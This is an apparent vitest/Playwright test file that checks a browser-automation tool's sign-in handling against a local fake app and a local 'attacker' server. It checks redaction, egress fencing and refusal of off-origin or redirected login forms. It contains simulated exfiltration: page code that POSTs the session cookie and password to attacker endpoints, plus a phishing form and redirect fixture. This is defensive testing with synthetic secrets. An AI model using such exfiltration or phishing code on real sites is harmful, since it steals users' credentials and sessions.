/**
 * Local synthetic sign-in. The password and cookie exist only in this file
 * and in the browser for the duration of the test. They must not appear in
 * metadata, logs, or the attacker server.
 */

import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import { mkdtempSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { chromium, type Browser } from 'playwright';
import { executeAction } from '../src/runner/actions.js';
import { captureDisabled } from '../src/auth/redact.js';
import {
  createMemorySecretProvider,
  establishFormAuth,
  establishManualAuth,
  openFencedContext,
  readAuthSession,
  writeAuthSession,
} from '../src/index.js';
import { policyFrom } from '../src/auth/origins.js';

const USER = 'ada@example.test';
const PASSWORD = 'synthetic-pass-9';
const COOKIE = 'fixture-session-cookie-value';

interface Hit {
  sawPassword: boolean;
  sawCookie: boolean;
}

function bodyHas(body: string, secret: string): boolean {
  return body.includes(secret);
}

async function readBody(req: IncomingMessage): Promise<string> {
  const chunks: Buffer[] = [];
  for await (const chunk of req) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function listen(handler: (req: IncomingMessage, res: ServerResponse) => void): Promise<{ origin: string; close: () => Promise<void> }> {
  const server = createServer(handler);
  return new Promise((resolve, reject) => {
    server.listen(0, '127.0.0.1', () => {
      const address = server.address();
      if (!address || typeof address === 'string') {
        reject(new Error('no port'));
        return;
      }
      resolve({
        origin: `http://127.0.0.1:${address.port}`,
        close: () => new Promise(done => server.close(() => done())),
      });
    });
  });
}

describe('local synthetic sign-in', () => {
  let appOrigin = '';
  let attackerOrigin = '';
  let closeApp: () => Promise<void> = async () => {};
  let closeAttacker: () => Promise<void> = async () => {};
  const hits: Hit[] = [];
  let browser: Browser;

  beforeAll(async () => {
    const attacker = await listen(async (req, res) => {
      const body = await readBody(req);
      const header = `${req.headers.cookie || ''}\n${req.headers.authorization || ''}\n${req.url || ''}`;
      hits.push({
        sawPassword: bodyHas(body, PASSWORD) || bodyHas(header, PASSWORD),
        sawCookie: bodyHas(body, COOKIE) || bodyHas(header, COOKIE),
      });
      res.writeHead(204);
      res.end();
    });
    attackerOrigin = attacker.origin;
    closeAttacker = attacker.close;

    const app = await listen(async (req, res) => {
      const url = new URL(req.url || '/', appOrigin);
      if (req.method === 'GET' && url.pathname === '/login') {
        res.writeHead(200, { 'content-type': 'text/html' });
        const action = url.searchParams.get('mfa') === '1' ? '/login?mfa=1' : '/login';
        res.end(`<!doctype html><form method="post" action="${action}"><input name="email" type="email"><input name="password" type="password"><button type="submit">Sign in</button></form>`);
        return;
      }
      if (req.method === 'GET' && url.pathname === '/offsite') {
        res.writeHead(200, { 'content-type': 'text/html' });
        res.end(`<!doctype html><form method="post" action="${attackerOrigin}/steal"><input name="email" type="email"><input name="password" type="password"><button type="submit">Sign in</button></form>`);
        return;
      }
      if (req.method === 'GET' && url.pathname === '/bounce') {
        res.writeHead(302, { location: `${attackerOrigin}/phish` });
        res.end();
        return;
      }
      if (req.method === 'POST' && url.pathname === '/login') {
        const body = await readBody(req);
        const params = new URLSearchParams(body);
        const ok = params.get('email') === USER && params.get('password') === PASSWORD;
        if (url.searchParams.get('mfa') === '1' && ok) {
          res.writeHead(200, { 'content-type': 'text/html' });
          res.end('<!doctype html><p>Enter the verification code</p><input name="otp" autocomplete="one-time-code">');
          return;
        }
        if (!ok) {
          res.writeHead(200, { 'content-type': 'text/html' });
          res.end('<!doctype html><form method="post" action="/login"><p>Invalid credentials</p><input name="email" type="email"><input name="password" type="password"><button type="submit">Sign in</button></form>');
          return;
        }
        res.writeHead(302, {
          location: '/app',
          'set-cookie': `session=${COOKIE}; HttpOnly; Path=/`,
        });
        res.end();
        return;
      }
      if (url.pathname === '/app') {
        const cookie = req.headers.cookie || '';
        if (!cookie.includes(COOKIE)) {
          res.writeHead(302, { location: '/login' });
          res.end();
          return;
        }
        res.writeHead(200, { 'content-type': 'text/html' });
        res.end('<!doctype html><p>Signed in</p>');
        return;
      }
      res.writeHead(404);
      res.end();
    });
    appOrigin = app.origin;
    closeApp = app.close;
    browser = await chromium.launch({ headless: true });
  });

  afterAll(async () => {
    await browser?.close();
    await closeApp();
    await closeAttacker();
  });

  it('signs in on loopback, fences egress, and does not keep the session for a fresh context', async () => {
    const logs: string[] = [];
    const originals = [console.log, console.warn, console.error, console.info];
    console.log = (...args: unknown[]) => { logs.push(args.map(String).join(' ')); };
    console.warn = console.log;
    console.error = console.log;
    console.info = console.log;
    hits.length = 0;
    const capture = mkdtempSync(join(tmpdir(), 'mt-cap-'));
    let result;
    try {
      result = await establishFormAuth({
        targetUrl: `${appOrigin}/login`,
        provider: createMemorySecretProvider({ username: USER, password: PASSWORD }),
        headless: true,
      });
    } finally {
      [console.log, console.warn, console.error, console.info] = originals;
    }
    expect(result.ok).toBe(true);
    expect(JSON.stringify(result)).not.toContain(PASSWORD);
    expect(JSON.stringify(result)).not.toContain(COOKIE);
    expect(logs.join('\n')).not.toContain(PASSWORD);
    expect(readdirSync(capture)).toEqual([]);
    if (!result.ok) return;

    const context = await openFencedContext(browser, {
      storageState: result.storageState,
      authOrigin: result.authOrigin,
      viewport: { width: 800, height: 600 },
    });
    const page = await context.newPage();
    expect(captureDisabled(page)).toBe(true);
    expect(page.video()).toBeNull();
    await page.goto(`${appOrigin}/app`, { waitUntil: 'domcontentloaded' });
    await page.waitForTimeout(300);
    expect(await page.locator('body').innerText()).toContain('Signed in');
    expect(await page.locator('body').innerText()).not.toContain(PASSWORD);
    hits.length = 0;
    await page.evaluate(({ attacker, cookie, password }) => {
      void fetch(`${attacker}/leak`, { method: 'POST', headers: { Authorization: `Bearer ${cookie}` }, body: password });
      void fetch(`${attacker}/q?p=${cookie}`);
    }, { attacker: attackerOrigin, cookie: COOKIE, password: PASSWORD });
    await page.waitForTimeout(300);
    expect(hits.some(hit => hit.sawPassword || hit.sawCookie)).toBe(false);
    await context.close();

    const fresh = await browser.newContext();
    const loggedOut = await fresh.newPage();
    await loggedOut.goto(`${appOrigin}/app`, { waitUntil: 'domcontentloaded' });
    expect(loggedOut.url()).toContain('/login');
    await fresh.close();

    const root = mkdtempSync(join(tmpdir(), 'mt-rerun-'));
    const path = join(root, 'auth', 'session.json');
    const policy = policyFrom(`${appOrigin}/login`);
    if (!policy.ok) throw new Error('policy');
    writeAuthSession({ path, policy: policy.policy, storageState: result.storageState });
    expect(readAuthSession(path, policy.policy, { allow: false }).storageState).toBeUndefined();
    const again = readAuthSession(path, policy.policy, { allow: true });
    expect(again.metadata.status).toBe('authenticated');
    expect(JSON.stringify(again.metadata)).not.toContain(COOKIE);
  });

  it('reports rejected credentials, MFA, and off-origin posts without sending the password', async () => {
    const wrong = await establishFormAuth({
      targetUrl: `${appOrigin}/login`,
      provider: createMemorySecretProvider({ username: USER, password: 'not-the-password' }),
      headless: true,
    });
    expect(wrong.ok).toBe(false);
    if (!wrong.ok) expect(wrong.metadata.status).toBe('credentials_rejected');
    expect(JSON.stringify(wrong)).not.toContain('not-the-password');

    const mfa = await establishFormAuth({
      targetUrl: `${appOrigin}/login?mfa=1`,
      provider: createMemorySecretProvider({ username: USER, password: PASSWORD }),
      headless: true,
    });
    expect(mfa.ok).toBe(false);
    if (!mfa.ok) expect(mfa.metadata.status).toBe('mfa_required');
    expect(JSON.stringify(mfa)).not.toContain(PASSWORD);

    hits.length = 0;
    const off = await establishFormAuth({
      targetUrl: `${appOrigin}/offsite`,
      provider: createMemorySecretProvider({ username: USER, password: PASSWORD }),
      headless: true,
    });
    expect(off.ok).toBe(false);
    if (!off.ok) expect(off.metadata.status).toBe('unsafe_origin');
    expect(hits.some(hit => hit.sawPassword)).toBe(false);

    hits.length = 0;
    const bounce = await establishFormAuth({
      targetUrl: `${appOrigin}/bounce`,
      provider: createMemorySecretProvider({ username: USER, password: PASSWORD }),
      headless: true,
    });
    expect(bounce.ok).toBe(false);
    if (!bounce.ok) expect(bounce.metadata.status).toBe('unsafe_origin');
    expect(hits.some(hit => hit.sawPassword || hit.sawCookie)).toBe(false);
  });

  it('manual login does not receive the password and signed-in runs do not type one', async () => {
    const manual = await establishManualAuth({
      targetUrl: `${appOrigin}/login`,
      headless: true,
      settle: async page => {
        await page.locator('input[type="email"]').fill(USER);
        await page.locator('input[type="password"]').fill(PASSWORD);
        await page.locator('button[type="submit"]').click();
        await page.waitForURL('**/app');
      },
    });
    expect(manual.ok).toBe(true);
    expect(JSON.stringify(manual)).not.toContain(PASSWORD);

    const context = await browser.newContext();
    const page = await context.newPage();
    await page.setContent('<input type="password" name="password">');
    const outcome = await executeAction(page, {
      tool: 'fill',
      target: 'input[name="password"]',
      locator: 'css',
      value: PASSWORD,
    }, 5_000, { readMostly: true });
    expect(outcome.status).toBe('skipped');
    expect(outcome.observation).not.toContain(PASSWORD);
    await context.close();
  });
});
